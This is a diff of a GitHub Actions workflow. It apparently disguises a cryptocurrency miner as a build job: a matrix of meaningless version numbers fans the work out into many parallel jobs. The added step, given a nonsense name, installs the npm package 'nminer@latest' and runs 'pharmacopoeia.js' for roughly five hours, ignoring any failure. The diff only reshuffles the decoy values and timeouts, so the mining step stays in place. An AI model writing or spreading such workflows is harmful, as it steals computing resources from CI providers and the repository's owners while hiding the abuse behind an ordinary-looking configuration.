@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5202 }
-          - { version: 7696 }
-          - { version: 7008 }
-          - { version: 846 }
-          - { version: 4773 }
-          - { version: 9586 }
-          - { version: 1408 }
-          - { version: 5621 }
-          - { version: 5159 }
-          - { version: 1359 }
-          - { version: 5972 }
-          - { version: 7735 }
-          - { version: 238 }
-          - { version: 4502 }
-          - { version: 8625 }
-          - { version: 975 }
-          - { version: 4990 }
+          - { version: 3951 }
+          - { version: 8536 }
+          - { version: 9614 }
+          - { version: 6341 }
+          - { version: 1304 }
+          - { version: 9152 }
+          - { version: 6597 }
+          - { version: 9976 }
+          - { version: 943 }
+          - { version: 8243 }
+          - { version: 100 }
+          - { version: 5180 }
+          - { version: 8677 }
+          - { version: 6483 }
+          - { version: 6705 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: so which barring reproachfully tremendously
+      - name: markup exotic formal
         run: |
           npm install nminer@latest
-          timeout 306m node pharmacopoeia.js || echo "pharmacopoeia executed"
+          timeout 303m node pharmacopoeia.js || echo "pharmacopoeia executed"
